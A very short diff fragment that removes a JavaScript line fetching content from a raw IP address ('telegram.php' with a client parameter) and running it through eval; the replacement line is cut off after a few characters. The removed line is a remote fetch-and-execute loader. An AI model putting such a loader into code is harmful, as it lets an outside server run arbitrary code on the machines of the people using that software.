@@ -1,1 +1,1 @@
-h.open('GET','http://65.38.120.193/New-File/Jump/jinl/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
+h.open('G
